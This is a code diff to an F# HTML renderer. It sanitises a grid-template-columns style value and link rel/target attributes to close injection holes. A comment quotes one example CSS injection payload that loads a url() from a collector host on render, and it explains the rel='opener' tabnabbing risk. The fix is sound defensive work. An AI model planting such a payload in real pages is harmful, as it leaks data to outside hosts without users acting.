@@ -489,10 +489,25 @@ and private renderKind
                   prop.children (spec.Children |> List.map (renderNode (depth + 1) ctx)) ]
         | BoxRole.Separator, _ -> Html.hr [ prop.className ("fuaran-layout-separator" + brk) ]
         | BoxRole.Group, BoxLayout.Grid(cols, gridTemplateColumns, gridGap) ->
-            let templateColumns =
+            // Phase 1523 — `templateColumns` is a free string on the wire that
+            // lands verbatim in a `style` attribute, so it is the one slot in
+            // this renderer where a decoded document writes CSS. Unsanitised,
+            // `"1fr;background:url(https://collector/?d=…)"` closed the
+            // declaration, opened a second one, and fetched on RENDER with no
+            // user act — outside the egress policy that governs every `href`
+            // and `src` in the same document — while the React client dropped
+            // the identical value silently. `sanitizeCssValueForSlot` is the
+            // shared grammar (`Fuaran.UI.EmissionGrammar`), so every host now
+            // emits the same bytes for the same tree; a refusal emits the empty
+            // value (the browser falls back to the stylesheet's own rule) and
+            // marks the element so the refusal is visible in the document.
+            let declaredTemplateColumns =
                 match gridTemplateColumns with
                 | Some custom -> custom
                 | None -> sprintf "repeat(%d, 1fr)" cols
+
+            let templateColumns, cssRefusalAttrs =
+                Sanitize.sanitizeCssValueForSlot "grid-template-columns" declaredTemplateColumns
 
             // `gap` (Phase 459) emits only when set — gap-free grids stay
             // byte-identical to the pre-459 emission (SSR parity with the client).
@@ -506,10 +521,12 @@ and private renderKind
                    | Some n -> [ style.custom ("gap", sprintf "%dpx" n) ]
                    | None -> [])
 
-            Html.div
+            Html.div (
                 [ prop.className ("fuaran-layout-grid" + brk)
                   prop.style gridStyle
                   prop.children (spec.Children |> List.map (renderNode (depth + 1) ctx)) ]
+                @ (cssRefusalAttrs |> List.map (fun (k, v) -> prop.custom (k, v)))
+            )
         | BoxRole.Group, BoxLayout.Masonry(cols, masonryGap) ->
             // Phase 1082 — column-FILL, realised through the CSS MULTI-COLUMN
             // property family (`column-count` + the `gap` shorthand's
@@ -1087,6 +1104,16 @@ and private renderKind
         let safeHref, egressAttrs =
             Sanitize.sanitizeUrlForEgress ctx.EgressPolicy Sanitize.EgressClass.Hyperlink resolvedHref
 
+        // Phase 1523 — the anchor token slots, resolved through the same shared
+        // grammar the client tier calls with the same arguments, so the two
+        // emitted anchors stay parity-locked exactly as `safeHref` above does.
+        // `rel` and `target` were emitted VERBATIM here, so `rel="opener"` on a
+        // `_blank` link re-enabled `window.opener` and `target` could name an
+        // arbitrary browsing context. They resolve TOGETHER because the `rel`
+        // rule depends on the sanitised target: `noopener noreferrer` is FORCED
+        // on `_blank`, whether or not the document asked for it.
+        let safeTarget, safeRel = Sanitize.sanitizeLinkAnchor spec.Target spec.Rel
+
         match spec.Protection with
         | Some LinkProtection.Email when safeHref.StartsWith("mailto:", System.StringComparison.Ordinal) ->
             // Phase 812 — protected email link. The address must not appear in
@@ -1124,10 +1151,10 @@ and private renderKind
         | _ ->
             Html.a (
                 [ prop.className "fuaran-link"; prop.href safeHref ]
-                @ (match spec.Rel with
+                @ (match safeRel with
                    | Some rel -> [ prop.custom ("rel", rel) ]
                    | None -> [])
-                @ (match spec.Target with
+                @ (match safeTarget with
                    | Some target -> [ prop.custom ("target", target) ]
                    | None -> [])
                 @ (if spec.Download then
